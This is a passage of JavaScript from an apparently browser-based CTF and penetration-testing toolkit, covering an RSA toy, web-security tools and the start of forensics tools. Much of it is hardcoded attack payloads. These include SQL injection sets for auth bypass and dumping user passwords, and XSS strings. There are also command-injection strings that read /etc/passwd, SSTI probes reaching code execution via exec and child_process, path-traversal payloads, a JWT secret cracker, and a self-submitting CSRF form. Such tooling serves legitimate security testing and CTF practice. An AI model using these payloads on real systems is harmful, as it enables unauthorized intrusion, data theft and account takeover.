  setOut('passStrengthOutput', '<span class="badge ' + cls + '">' + label + ' — ' + score + '/100</span>' +
    (COMMON_PASSWORDS.includes(pw.toLowerCase()) ? '<div class="hint warn">This is in the top 50 most common leaked passwords.</div>' : ''));
}

/* ---------------------------------------------------------------------- */
/* RSA toy tool — real modular arithmetic on small numbers                */
/* ---------------------------------------------------------------------- */
function isProbablePrimeBig(n, rounds) {
  if (n < 2n) return false;
  for (const p of [2n, 3n, 5n, 7n, 11n, 13n, 17n, 19n, 23n]) { if (n === p) return true; if (n % p === 0n) return false; }
  let d = n - 1n, r = 0n;
  while (d % 2n === 0n) { d /= 2n; r++; }
  function modPow(base, exp, mod) {
    base %= mod; let result = 1n;
    while (exp > 0n) { if (exp & 1n) result = (result * base) % mod; base = (base * base) % mod; exp >>= 1n; }
    return result;
  }
  for (let i = 0; i < rounds; i++) {
    const a = 2n + BigInt(Math.floor(Math.random() * 1e9)) % (n - 4n);
    let x = modPow(a, d, n);
    if (x === 1n || x === n - 1n) continue;
    let composite = true;
    for (let j = 0n; j < r - 1n; j++) { x = (x * x) % n; if (x === n - 1n) { composite = false; break; } }
    if (composite) return false;
  }
  return true;
}
function randomPrimeBig(bits) {
  while (true) {
    let n = 0n;
    const bytes = Math.ceil(bits / 8);
    const arr = new Uint8Array(bytes);
    crypto.getRandomValues(arr);
    for (const b of arr) n = (n << 8n) | BigInt(b);
    n |= 1n; // odd
    n |= (1n << BigInt(bits - 1)); // top bit set
    if (isProbablePrimeBig(n, 10)) return n;
  }
}
function egcdBig(a, b) {
  if (b === 0n) return [a, 1n, 0n];
  const [g, x1, y1] = egcdBig(b, a % b);
  return [g, y1, x1 - (a / b) * y1];
}
function modInverseBig(a, m) {
  const [g, x] = egcdBig(a, m);
  if (g !== 1n) throw new Error('No modular inverse');
  return ((x % m) + m) % m;
}
function modPowBig(base, exp, mod) {
  base %= mod; let result = 1n;
  while (exp > 0n) { if (exp & 1n) result = (result * base) % mod; base = (base * base) % mod; exp >>= 1n; }
  return result;
}
let RSA_STATE = null;
function rsaGenTool() {
  const bits = Number(document.getElementById('rsaBits').value);
  const half = Math.max(8, Math.floor(bits / 2));
  const p = randomPrimeBig(half), q = randomPrimeBig(half);
  const n = p * q, phi = (p - 1n) * (q - 1n);
  let e = 65537n;
  if (egcdBig(e, phi)[0] !== 1n) e = 3n;
  while (egcdBig(e, phi)[0] !== 1n) e += 2n;
  const d = modInverseBig(e, phi);
  RSA_STATE = { p: p, q: q, n: n, e: e, d: d };
  setOut('rsaKeyOutput', '<table class="kv-table">' +
    '<tr><td>p</td><td>' + p + '</td></tr><tr><td>q</td><td>' + q + '</td></tr>' +
    '<tr><td>n = p·q</td><td>' + n + '</td></tr><tr><td>Public (e, n)</td><td>(' + e + ', ' + n + ')</td></tr>' +
    '<tr><td>Private (d, n)</td><td>(' + d + ', ' + n + ')</td></tr></table>');
}
function rsaEncryptTool() {
  if (!RSA_STATE) { toast('Generate a keypair first', 'err'); return; }
  try {
    const m = BigInt(document.getElementById('rsaMsg').value.trim());
    if (m >= RSA_STATE.n) { setOutText('rsaOutput', 'Message must be smaller than n.'); return; }
    const c = modPowBig(m, RSA_STATE.e, RSA_STATE.n);
    document.getElementById('rsaCt').value = c.toString();
    setOutText('rsaOutput', 'Ciphertext c = m^e mod n = ' + c);
  } catch (e) { setOutText('rsaOutput', 'Enter a valid integer message.'); }
}
function rsaDecryptTool() {
  if (!RSA_STATE) { toast('Generate a keypair first', 'err'); return; }
  try {
    const c = BigInt(document.getElementById('rsaCt').value.trim());
    const m = modPowBig(c, RSA_STATE.d, RSA_STATE.n);
    setOutText('rsaOutput', 'Decrypted m = c^d mod n = ' + m);
  } catch (e) { setOutText('rsaOutput', 'Enter a valid integer ciphertext.'); }
}

/* ---------------------------------------------------------------------- */
/* WEB SECURITY — catalog                                                 */
/* ---------------------------------------------------------------------- */
registerTool('web', 'WEB', 'WEB-01', 'sql-injection', 'SQL Injection Payloads', 'Generates UNION, boolean, time-based and error-based payload sets.');
registerTool('web', 'WEB', 'WEB-02', 'xss-payloads', 'XSS Payload Generator', 'Context-aware XSS payloads for HTML, attribute, JS and URL contexts.');
registerTool('web', 'WEB', 'WEB-03', 'jwt', 'JWT Decoder & Cracker', 'Decodes header/payload, flags weak settings, and brute-forces HS256 secrets.');
registerTool('web', 'WEB', 'WEB-04', 'request-builder', 'HTTP Request Builder', 'Builds a raw HTTP request and matching curl/fetch snippets.');
registerTool('web', 'WEB', 'WEB-05', 'header-analyzer', 'Security Header Analyzer', 'Checks pasted response headers against the standard hardening set.');
registerTool('web', 'WEB', 'WEB-06', 'cmd-injection', 'Command Injection Payloads', 'OS command injection payloads for Linux and Windows targets.');
registerTool('web', 'WEB', 'WEB-07', 'ssti', 'SSTI Payload Generator', 'Server-side template injection probes for Jinja2, Twig, Freemarker and more.');
registerTool('web', 'WEB', 'WEB-08', 'path-traversal', 'Path Traversal Generator', 'Directory traversal payloads with encoding and depth variants.');
registerTool('web', 'WEB', 'WEB-09', 'cookie-inspector', 'Cookie / Set-Cookie Inspector', 'Parses a Set-Cookie header and flags missing security attributes.');
registerTool('web', 'WEB', 'WEB-10', 'csrf-poc', 'CSRF PoC Generator', 'Builds a self-submitting HTML form to demonstrate a CSRF finding.');
registerTool('web', 'WEB', 'WEB-11', 'regex-tester', 'Regex Tester', 'Live JavaScript regex matching with capture groups highlighted.');
registerTool('web', 'WEB', 'WEB-12', 'js-beautifier', 'JS/CSS/HTML Beautifier', 'Reformats minified or obfuscated-looking source for easier reading.');

const WEB_INTERFACES = {
  'sql-injection': function () {
    return ui_field('Injection point (for context only — nothing is sent anywhere)', '<input type="text" id="sqlTarget" placeholder="e.g. id parameter in ?id=1">') +
      '<div class="field"><label>Database</label><select id="sqlDb"><option>Generic</option><option>MySQL</option><option>PostgreSQL</option><option>MSSQL</option><option>SQLite</option><option>Oracle</option></select></div>' +
      ui_btns([{ label: 'Generate payload set', onclick: 'generateSqlPayloads()', primary: true }]) +
      ui_field('Payloads', ui_out('sqlOutput'));
  },
  'xss-payloads': function () {
    return '<div class="field"><label>Reflection context</label><select id="xssCtx"><option value="html">HTML body</option><option value="attr">HTML attribute</option><option value="js">Inside a &lt;script&gt; string</option><option value="url">URL / href</option></select></div>' +
      ui_btns([{ label: 'Generate payloads', onclick: 'generateXssPayloads()', primary: true }]) +
      ui_field('Payloads', ui_out('xssOutput'));
  },
  jwt: function () {
    return ui_field('JWT', ui_textarea('jwtInput', 4, 'Paste a token: eyJ...')) +
      ui_btns([{ label: 'Decode', onclick: 'decodeJwtTool()', primary: true }, { label: 'Security review', onclick: 'reviewJwtTool()' }]) +
      ui_field('Decoded', ui_out('jwtOutput')) +
      ui_field('Crack HS256 secret against a wordlist (one per line, blank = built-in common-secrets list)', ui_textarea('jwtWordlist', 3, '')) +
      ui_btns([{ label: 'Try to crack HMAC secret', onclick: 'crackJwtTool()' }]) +
      ui_field('Crack result', ui_out('jwtCrackOutput'));
  },
  'request-builder': function () {
    return '<div class="row2">' + ui_field('Method', '<select id="reqMethod"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option></select>') +
      ui_field('URL', '<input type="text" id="reqUrl" placeholder="https://target.example/api/resource">') + '</div>' +
      ui_field('Headers (one per line, Name: value)', ui_textarea('reqHeaders', 3, 'Content-Type: application/json\nAuthorization: Bearer <token>')) +
      ui_field('Body', ui_textarea('reqBody', 4, '{"key":"value"}')) +
      ui_btns([{ label: 'Build request', onclick: 'buildRequestTool()', primary: true }]) +
      ui_field('Raw HTTP', ui_out('reqRawOutput')) +
      ui_field('curl', ui_out('reqCurlOutput')) +
      ui_field('fetch()', ui_out('reqFetchOutput'));
  },
  'header-analyzer': function () {
    return ui_field('Paste response headers', ui_textarea('headersInput', 8, 'HTTP/1.1 200 OK\nContent-Type: text/html\nServer: nginx\n…')) +
      ui_btns([{ label: 'Analyze', onclick: 'analyzeHeadersTool()', primary: true }]) +
      ui_field('Report', ui_out('headersOutput'));
  },
  'cmd-injection': function () {
    return '<div class="field"><label>Target OS</label><select id="cmdOs"><option value="linux">Linux / Unix</option><option value="windows">Windows</option></select></div>' +
      ui_btns([{ label: 'Generate payloads', onclick: 'generateCmdPayloads()', primary: true }]) +
      ui_field('Payloads', ui_out('cmdOutput'));
  },
  ssti: function () {
    return '<div class="field"><label>Template engine</label><select id="sstiEngine"><option value="all">Probe for all (polyglot-friendly)</option><option value="jinja2">Jinja2 / Flask</option><option value="twig">Twig / Symfony</option><option value="freemarker">Freemarker (Java)</option><option value="velocity">Velocity (Java)</option><option value="ejs">EJS / Node</option></select></div>' +
      ui_btns([{ label: 'Generate probes', onclick: 'generateSstiPayloads()', primary: true }]) +
      ui_field('Payloads', ui_out('sstiOutput'));
  },
  'path-traversal': function () {
    return ui_field('Target file (relative to app root)', '<input type="text" id="travFile" value="etc/passwd" placeholder="etc/passwd">') +
      ui_field('Max traversal depth', '<input type="number" id="travDepth" value="8" min="1" max="20">') +
      ui_btns([{ label: 'Generate payloads', onclick: 'generateTraversalPayloads()', primary: true }]) +
      ui_field('Payloads', ui_out('travOutput'));
  },
  'cookie-inspector': function () {
    return ui_field('Set-Cookie header(s)', ui_textarea('cookieInput', 5, 'session=abc123; Path=/; HttpOnly')) +
      ui_btns([{ label: 'Inspect', onclick: 'inspectCookieTool()', primary: true }]) +
      ui_field('Report', ui_out('cookieOutput'));
  },
  'csrf-poc': function () {
    return ui_field('Target URL', '<input type="text" id="csrfUrl" placeholder="https://target.example/account/email/change">') +
      '<div class="field"><label>Method</label><select id="csrfMethod"><option>POST</option><option>GET</option></select></div>' +
      ui_field('Form fields (one per line, name=value)', ui_textarea('csrfFields', 3, 'email=attacker@evil.example\nconfirm=1')) +
      ui_btns([{ label: 'Generate PoC HTML', onclick: 'generateCsrfPoc()', primary: true }]) +
      ui_field('PoC', ui_out('csrfOutput'));
  },
  'regex-tester': function () {
    return ui_field('Pattern', '<input type="text" id="regexPattern" placeholder="flag\\{[^}]+\\}">') +
      '<div class="field"><label>Flags</label><input type="text" id="regexFlags" value="g" placeholder="g i m s"></div>' +
      ui_field('Test string', ui_textarea('regexSubject', 6, 'Paste text to test against')) +
      ui_btns([{ label: 'Test', onclick: 'testRegexTool()', primary: true }]) +
      ui_field('Matches', ui_out('regexOutput'));
  },
  'js-beautifier': function () {
    return ui_field('Source', ui_textarea('beautifyInput', 8, 'Paste minified JS, CSS or HTML')) +
      '<div class="field"><label>Language</label><select id="beautifyLang"><option value="js">JavaScript</option><option value="css">CSS</option><option value="html">HTML</option></select></div>' +
      ui_btns([{ label: 'Beautify', onclick: 'beautifyTool()', primary: true }]) +
      ui_field('Formatted', ui_out('beautifyOutput')) + ui_copyBtn('beautifyOutput');
  }
};

function generateSqlPayloads() {
  const db = document.getElementById('sqlDb').value;
  const basics = ["'", "''", "' OR '1'='1", "' OR 1=1 -- -", '" OR "1"="1', "' OR 1=1#", "admin'--", "' OR 'a'='a"];
  const union = ["' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -", "' UNION SELECT NULL,NULL,NULL-- -", "' UNION SELECT username,password FROM users-- -"];
  const boolean = ["' AND 1=1-- -", "' AND 1=2-- -", "' AND SUBSTRING((SELECT @@version),1,1)='5'-- -"];
  const time = { MySQL: "' AND SLEEP(5)-- -", PostgreSQL: "'; SELECT pg_sleep(5)-- -", MSSQL: "'; WAITFOR DELAY '0:0:5'-- -", SQLite: "' AND 1=randomblob(500000000)-- -", Oracle: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", Generic: "' OR SLEEP(5)-- -" };
  const error = { MySQL: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", PostgreSQL: "' AND 1=CAST((SELECT version()) AS int)-- -", MSSQL: "' AND 1=CONVERT(int,(SELECT @@version))-- -", SQLite: "' AND 1=CAST((SELECT sqlite_version()) AS int)-- -", Oracle: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version))-- -", Generic: "' AND 1=CAST((SELECT 1) AS char)-- -" };
  const html = '<strong>Basic auth bypass</strong>\n' + basics.join('\n') +
    '\n\n<strong>UNION-based</strong>\n' + union.join('\n') +
    '\n\n<strong>Boolean-based blind</strong>\n' + boolean.join('\n') +
    '\n\n<strong>Time-based blind (' + db + ')</strong>\n' + (time[db] || time.Generic) +
    '\n\n<strong>Error-based (' + db + ')</strong>\n' + (error[db] || error.Generic);
  setOut('sqlOutput', escapeHtml(html).replace(/&lt;strong&gt;/g, '<strong style="color:var(--teal)">').replace(/&lt;\/strong&gt;/g, '</strong>'));
}

function generateXssPayloads() {
  const ctx = document.getElementById('xssCtx').value;
  const sets = {
    html: ['<script>alert(document.domain)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<body onload=alert(1)>', '<iframe src="javascript:alert(1)">'],
    attr: ['"><script>alert(1)</script>', '" onmouseover="alert(1)', "' autofocus onfocus='alert(1)", '" onfocus="alert(1)" autofocus "'],
    js: ["';alert(1);//", '\\\';alert(1);//', '</script><script>alert(1)</script>', '${alert(1)}'],
    url: ['javascript:alert(1)', 'javascript:alert(document.domain)//', 'data:text/html,<script>alert(1)</script>']
  };
  setOutText('xssOutput', sets[ctx].join('\n'));
}

function b64urlDecodeStr(s) {
  s = s.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return decodeURIComponent(escape(atob(s)));
}
function b64urlEncodeStr(s) {
  return btoa(unescape(encodeURIComponent(s))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function decodeJwtTool() {
  const token = document.getElementById('jwtInput').value.trim();
  const parts = token.split('.');
  if (parts.length < 2) { setOutText('jwtOutput', 'Not a JWT — expected header.payload.signature'); return; }
  try {
    const header = JSON.parse(b64urlDecodeStr(parts[0]));
    const payload = JSON.parse(b64urlDecodeStr(parts[1]));
    // header/payload come from an attacker-controlled pasted token — escape before innerHTML
    let html = '<strong style="color:var(--teal)">Header</strong>\n' + escapeHtml(JSON.stringify(header, null, 2)) + '\n\n<strong style="color:var(--teal)">Payload</strong>\n' + escapeHtml(JSON.stringify(payload, null, 2));
    if (payload.exp) html += '\n\nExpires: ' + new Date(payload.exp * 1000).toISOString() + (payload.exp * 1000 < Date.now() ? '  (expired)' : '  (valid)');
    setOut('jwtOutput', html);
  } catch (e) { setOutText('jwtOutput', 'Could not parse: ' + e.message); }
}
function reviewJwtTool() {
  const token = document.getElementById('jwtInput').value.trim();
  const parts = token.split('.');
  if (parts.length < 2) { setOutText('jwtOutput', 'Not a JWT.'); return; }
  const findings = [];
  try {
    const header = JSON.parse(b64urlDecodeStr(parts[0]));
    const payload = JSON.parse(b64urlDecodeStr(parts[1]));
    if (header.alg === 'none') findings.push(['bad', '"alg":"none" accepted by some libraries — try stripping the signature entirely.']);
    if (header.alg === 'HS256') findings.push(['warn', 'HS256 — if the server also trusts RS256 and exposes its RSA public key, an alg-confusion attack (signing with the public key as an HMAC secret) may work.']);
    if (!payload.exp) findings.push(['warn', 'No "exp" claim — token may never expire.']);
    if (!payload.iat) findings.push(['warn', 'No "iat" claim.']);
    if (header.alg && /^(HS256|HS384|HS512)$/.test(header.alg)) findings.push(['good', 'Use the cracker below to test the secret against a wordlist.']);
    if (!findings.length) findings.push(['good', 'No obvious red flags from static inspection alone.']);
    setOut('jwtOutput', findings.map(function (f) { return '<span class="badge ' + f[0] + '">' + f[0].toUpperCase() + '</span> ' + f[1]; }).join('<br><br>'));
  } catch (e) { setOutText('jwtOutput', 'Could not parse: ' + e.message); }
}
const JWT_COMMON_SECRETS = ['secret', 'password', '123456', 'jwt_secret', 'your-256-bit-secret', 'changeme', 'supersecret', 'secretkey', 'key', 'admin', 'test', 'default', 'qwerty', 'letmein', 'topsecret', 'jwtsecret', 'mysecret', 'private', 'signing-key', 'ctf'];
function crackJwtTool() {
  const token = document.getElementById('jwtInput').value.trim();
  const parts = token.split('.');
  if (parts.length !== 3) { setOutText('jwtCrackOutput', 'Need a full header.payload.signature token.'); return; }
  let header;
  try { header = JSON.parse(b64urlDecodeStr(parts[0])); } catch (e) { setOutText('jwtCrackOutput', 'Could not parse header.'); return; }
  if (!/^HS(256|384|512)$/.test(header.alg)) { setOutText('jwtCrackOutput', 'Only HS256/384/512 secrets can be brute-forced this way (algorithm is ' + header.alg + ').'); return; }
  const custom = document.getElementById('jwtWordlist').value.split('\n').map(function (s) { return s.trim(); }).filter(Boolean);
  const list = custom.length ? custom : JWT_COMMON_SECRETS;
  const signingInput = parts[0] + '.' + parts[1];
  const algoMap = { HS256: CryptoJS.HmacSHA256, HS384: CryptoJS.HmacSHA384, HS512: CryptoJS.HmacSHA512 };
  const hmac = algoMap[header.alg];
  for (const secret of list) {
    const sig = CryptoJS.enc.Base64.stringify(hmac(signingInput, secret)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    if (sig === parts[2]) { setOutText('jwtCrackOutput', 'Secret found: "' + secret + '"  (' + list.length + ' tried)'); return; }
  }
  setOutText('jwtCrackOutput', 'No match in ' + list.length + ' candidates. Paste a bigger wordlist (e.g. rockyou-style) for a real attempt.');
}

function buildRequestTool() {
  const method = document.getElementById('reqMethod').value;
  const url = document.getElementById('reqUrl').value.trim() || 'https://target.example/';
  const headerLines = document.getElementById('reqHeaders').value.split('\n').map(function (l) { return l.trim(); }).filter(Boolean);
  const body = document.getElementById('reqBody').value;
  let u; try { u = new URL(url); } catch (e) { u = null; }
  const path = u ? (u.pathname + u.search) : url;
  const host = u ? u.host : 'target.example';
  // RFC 7230 requires CRLF line endings for a raw HTTP/1.1 request — a bare \n
  // is not guaranteed to be accepted by a strict server or parser.
  let raw = method + ' ' + path + ' HTTP/1.1\r\nHost: ' + host + '\r\n';
  headerLines.forEach(function (h) { raw += h + '\r\n'; });
  if (body && method !== 'GET') raw += 'Content-Length: ' + new TextEncoder().encode(body).length + '\r\n';
  raw += '\r\n' + (method !== 'GET' ? body : '');
  setOutText('reqRawOutput', raw);

  let curl = 'curl -X ' + method + " '" + url + "'";
  headerLines.forEach(function (h) { curl += " -H '" + h.replace(/'/g, "'\\''") + "'"; });
  if (body && method !== 'GET') curl += " --data '" + body.replace(/'/g, "'\\''") + "'";
  setOutText('reqCurlOutput', curl);

  const headersObj = {};
  headerLines.forEach(function (h) { const i = h.indexOf(':'); if (i > -1) headersObj[h.slice(0, i).trim()] = h.slice(i + 1).trim(); });
  const fetchCode = 'fetch(' + JSON.stringify(url) + ', {\n  method: ' + JSON.stringify(method) + ',\n  headers: ' + JSON.stringify(headersObj, null, 2).split('\n').join('\n  ') +
    (body && method !== 'GET' ? ',\n  body: ' + JSON.stringify(body) : '') + '\n});';
  setOutText('reqFetchOutput', fetchCode);
}

const SECURITY_HEADERS = {
  'content-security-policy': 'Restricts where scripts/styles/frames can load from — mitigates XSS impact.',
  'strict-transport-security': 'Forces HTTPS for future visits — prevents downgrade attacks.',
  'x-content-type-options': 'Set to "nosniff" to stop MIME-sniffing attacks.',
  'x-frame-options': 'Prevents clickjacking via iframes (superseded by CSP frame-ancestors).',
  'referrer-policy': 'Controls how much of the URL is leaked to other sites via Referer.',
  'permissions-policy': 'Restricts access to browser features like camera, geolocation.',
  'cross-origin-opener-policy': 'Isolates the browsing context — mitigates cross-origin attacks like Spectre.',
  'cross-origin-resource-policy': 'Restricts which origins can load this resource.'
};
function analyzeHeadersTool() {
  const text = document.getElementById('headersInput').value;
  const lines = text.split('\n');
  const found = {};
  lines.forEach(function (l) {
    const i = l.indexOf(':');
    if (i === -1) return;
    found[l.slice(0, i).trim().toLowerCase()] = l.slice(i + 1).trim();
  });
  let html = '<table class="kv-table">';
  Object.keys(SECURITY_HEADERS).forEach(function (h) {
    const present = found[h];
    html += '<tr><td>' + h + '</td><td>' + (present ? '<span class="badge good">present</span> ' + escapeHtml(present) : '<span class="badge bad">missing</span>') + '</td></tr>';
  });
  html += '</table><div class="hint">' + Object.entries(SECURITY_HEADERS).map(function (p) { return '<strong>' + p[0] + '</strong> — ' + p[1]; }).join('<br>') + '</div>';
  if (found['server']) html += '<div class="hint warn">Server header reveals: ' + escapeHtml(found['server']) + ' — consider suppressing in production (information disclosure).</div>';
  if (found['set-cookie'] && !/httponly/i.test(found['set-cookie'])) html += '<div class="hint warn">Set-Cookie is missing HttpOnly.</div>';
  setOut('headersOutput', html);
}

function generateCmdPayloads() {
  const os = document.getElementById('cmdOs').value;
  const linux = ['; id', '| id', '|| id', '& id', '&& id', '`id`', '$(id)', '; cat /etc/passwd', '; sleep 5', '$(sleep 5)'];
  const win = ['& whoami', '| whoami', '&& whoami', '|| whoami', '; whoami', '%0a whoami', '& ping -n 5 127.0.0.1'];
  setOutText('cmdOutput', (os === 'linux' ? linux : win).join('\n'));
}

function generateSstiPayloads() {
  const engine = document.getElementById('sstiEngine').value;
  const sets = {
    all: ['${7*7}', '{{7*7}}', '<%= 7*7 %>', '#{7*7}', '*{7*7}', '${{7*7}}', '@(7*7)'],
    jinja2: ['{{7*7}}', "{{config}}", "{{self.__init__.__globals__.__builtins__}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}"],
    twig: ['{{7*7}}', "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"],
    freemarker: ['${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'],
    velocity: ['#set($x=7*7)$x', '#set($e="exec")'],
    ejs: ['<%= 7*7 %>', "<%= global.process.mainModule.require('child_process').execSync('id') %>"]
  };
  setOutText('sstiOutput', sets[engine].join('\n\n'));
}

function generateTraversalPayloads() {
  const file = document.getElementById('travFile').value.trim() || 'etc/passwd';
  const depth = Math.max(1, Math.min(20, Number(document.getElementById('travDepth').value) || 8));
  const variants = [];
  for (let d = 2; d <= depth; d += 2) variants.push('../'.repeat(d) + file);
  variants.push('....//'.repeat(Math.min(6, depth)) + file);
  variants.push(encodeURIComponent('../'.repeat(6) + file));
  variants.push('..%2f'.repeat(6) + file);
  variants.push('%2e%2e%2f'.repeat(6) + file);
  variants.push('..\\/'.repeat(6) + file);
  variants.push('/' + file + '%00.png');
  setOutText('travOutput', variants.join('\n'));
}

function inspectCookieTool() {
  const text = document.getElementById('cookieInput').value;
  const lines = text.split('\n').filter(Boolean);
  let html = '';
  lines.forEach(function (line) {
    const parts = line.split(';').map(function (p) { return p.trim(); });
    const nameVal = parts.shift() || '';
    const attrs = parts.map(function (p) { return p.toLowerCase(); });
    const flags = [];
    flags.push(attrs.some(function (a) { return a === 'httponly'; }) ? ['good', 'HttpOnly'] : ['bad', 'missing HttpOnly — readable by JS, risk if XSS exists']);
    flags.push(attrs.some(function (a) { return a === 'secure'; }) ? ['good', 'Secure'] : ['warn', 'missing Secure — could be sent over plain HTTP']);
    const sameSite = attrs.find(function (a) { return a.startsWith('samesite'); });
    flags.push(sameSite ? ['good', sameSite] : ['warn', 'missing SameSite — CSRF exposure depends on other defenses']);
    html += '<p><strong>' + escapeHtml(nameVal) + '</strong></p><p>' + flags.map(function (f) { return '<span class="badge ' + f[0] + '">' + f[1] + '</span>'; }).join(' ') + '</p><hr style="border-color:var(--line-soft);margin:0.6rem 0">';
  });
  setOut('cookieOutput', html || '<div class="hint">Paste at least one Set-Cookie line.</div>');
}

function generateCsrfPoc() {
  const url = document.getElementById('csrfUrl').value.trim() || 'https://target.example/action';
  const method = document.getElementById('csrfMethod').value;
  const fields = document.getElementById('csrfFields').value.split('\n').map(function (l) { return l.trim(); }).filter(Boolean);
  const inputs = fields.map(function (f) {
    const i = f.indexOf('=');
    const name = i > -1 ? f.slice(0, i) : f;
    const val = i > -1 ? f.slice(i + 1) : '';
    return '  <input type="hidden" name="' + escapeHtml(name) + '" value="' + escapeHtml(val) + '">';
  }).join('\n');
  const html = '<!doctype html>\n<html>\n<body onload="document.forms[0].submit()">\n<form action="' + escapeHtml(url) + '" method="' + method + '">\n' + inputs + '\n  <input type="submit" value="go">\n</form>\n</body>\n</html>';
  setOutText('csrfOutput', html);
}

function beautifyTool() {
  const src = document.getElementById('beautifyInput').value;
  const lang = document.getElementById('beautifyLang').value;
  try {
    let out;
    if (lang === 'js') out = js_beautify(src, { indent_size: 2 });
    else if (lang === 'css') out = css_beautify(src, { indent_size: 2 });
    else out = html_beautify(src, { indent_size: 2 });
    setOutText('beautifyOutput', out);
  } catch (e) { setOutText('beautifyOutput', 'Error: ' + e.message); }
}

function testRegexTool() {
  const pattern = document.getElementById('regexPattern').value;
  const flags = document.getElementById('regexFlags').value.replace(/[^gimsuy]/g, '');
  const subject = document.getElementById('regexSubject').value;
  try {
    const re = new RegExp(pattern, flags.includes('g') ? flags : flags + 'g');
    const matches = Array.from(subject.matchAll(re));
    if (!matches.length) { setOutText('regexOutput', 'No matches.'); return; }
    const html = matches.map(function (m, i) {
      let line = 'match ' + (i + 1) + ': "' + escapeHtml(m[0]) + '" at index ' + m.index;
      if (m.length > 1) line += '\n  groups: ' + m.slice(1).map(function (g, gi) { return 'g' + (gi + 1) + '=' + JSON.stringify(g); }).join(', ');
      return line;
    }).join('\n');
    setOutText('regexOutput', html);
  } catch (e) { setOutText('regexOutput', 'Invalid regex: ' + e.message); }
}

/* ---------------------------------------------------------------------- */
/* FORENSICS — catalog                                                    */
/* ---------------------------------------------------------------------- */
registerTool('forensics', 'FOR', 'FOR-01', 'file-identifier', 'File Signature Identifier', 'Reads magic bytes to identify the real file type, regardless of extension.');
registerTool('forensics', 'FOR', 'FOR-02', 'metadata', 'Metadata Extractor', 'Pulls EXIF/text metadata out of PNG and JPEG files.');
registerTool('forensics', 'FOR', 'FOR-03', 'hex-viewer', 'Hex Viewer', 'Full hex + ASCII dump of any uploaded file, with byte search.');
registerTool('forensics', 'FOR', 'FOR-04', 'string-extractor', 'String Extractor', 'Pulls printable ASCII/UTF-16 strings out of a binary, with min-length filter.');
registerTool('forensics', 'FOR', 'FOR-05', 'lsb-stego', 'LSB Steganography', 'Extracts or hides data in the least-significant bit of an image, pixel by pixel.');
registerTool('forensics', 'FOR', 'FOR-06', 'stego-analyzer', 'Stego Analyzer', 'Chi-square LSB test and trailing-data-after-EOF check for PNG/JPEG.');
registerTool('forensics', 'FOR', 'FOR-07', 'pcap-parser', 'PCAP Parser', 'Parses a real .pcap file structure: packet timestamps, lengths and protocols.');
registerTool('forensics', 'FOR', 'FOR-08', 'file-carver', 'File Carver', 'Scans a binary blob for embedded file signatures (PNG, JPG, ZIP, PDF, GIF) and lets you cut them out.');
registerTool('forensics', 'FOR', 'FOR-09', 'zip-inspector', 'ZIP Inspector', 'Lists entries, sizes and encryption flags inside a .zip without extracting elsewhere.');
registerTool('forensics', 'FOR', 'FOR-10', 'b64-image-extractor', 'Base64 Blob → File', 'Finds base64 blobs in text and turns them back into downloadable files.');

const FORENSICS_INTERFACES = {
  'file-identifier': function () {
    return ui_field('File', '<input type="file" id="fileIdInput">') +
      ui_btns([{ label: 'Identify', onclick: 'identifyFileTool()', primary: true }]) +
      ui_field('Result', ui_out('fileIdOutput'));
  },
  metadata: function () {
    return ui_field('Image file (PNG or JPEG)', '<input type="file" id="metaInput" accept="image/png,image/jpeg">') +
      ui_btns([{ label: 'Extract metadata', onclick: 'extractMetadataTool()', primary: true }]) +
      ui_field('Metadata', ui_out('metaOutput'));
  },
  'hex-viewer': function () {
    return ui_field('File', '<input type="file" id="hexViewInput">') +
      ui_field('Find (hex bytes or text, optional)', '<input type="text" id="hexViewFind" placeholder="flag or 89504e47">') +
      ui_btns([{ label: 'Load & dump', onclick: 'hexViewTool()', primary: true }]) +
      '<div id="hexViewOutput" class="out hexdump"></div>';
  },
  'string-extractor': function () {
    return ui_field('File', '<input type="file" id="strInput">') +
      '<div class="row2">' + ui_field('Minimum length', '<input type="number" id="strMinLen" value="4" min="2" max="64">') +
      ui_field('Encoding', '<select id="strEncoding"><option value="ascii">ASCII</option><option value="utf16">UTF-16LE (Windows wide strings)</option><option value="both">Both</option></select>') + '</div>' +
      ui_btns([{ label: 'Extract strings', onclick: 'extractStringsTool()', primary: true }]) +
      ui_field('Strings found', ui_out('strOutput'));
  },
  'lsb-stego': function () {
    return ui_field('Image (PNG works best — JPEG recompresses and destroys LSB data)', '<input type="file" id="lsbInput" accept="image/*">') +
      '<div class="row2">' + ui_field('Bit plane', '<select id="lsbBit"><option value="0">LSB (bit 0)</option><option value="1">bit 1</option><option value="7">MSB (bit 7)</option></select>') +
      ui_field('Channels', '<select id="lsbChannels"><option value="rgb">R,G,B</option><option value="r">R only</option><option value="g">G only</option><option value="b">B only</option><option value="rgba">R,G,B,A</option></select>') + '</div>' +
      ui_btns([{ label: 'Extract hidden data', onclick: 'lsbExtractTool()', primary: true }, { label: 'Show bit plane as image', onclick: 'lsbVisualizeTool()' }]) +
      ui_field('Extracted (as text)', ui_out('lsbTextOutput')) +
      ui_field('Extracted (as hex)', ui_out('lsbHexOutput')) +
      '<canvas id="lsbCanvas" style="max-width:100%;border:1px solid var(--line);border-radius:4px;display:none;margin-top:0.6rem"></canvas>';
  },
  'stego-analyzer': function () {
    return ui_field('Image file', '<input type="file" id="stegoInput" accept="image/*">') +
      ui_btns([{ label: 'Run analysis', onclick: 'stegoAnalyzeTool()', primary: true }]) +
      ui_field('Report', ui_out('stegoOutput'));
  },
  'pcap-parser': function () {
    return ui_field('.pcap file (classic libpcap format)', '<input type="file" id="pcapInput" accept=".pcap">') +
      ui_btns([{ label: 'Parse', onclick: 'parsePcapTool()', primary: true }]) +
      ui_field('Packets', ui_out('pcapOutput'));
  },
  'file-carver': function () {
    return ui_field('File / blob to scan', '<input type="file" id="carveInput">') +
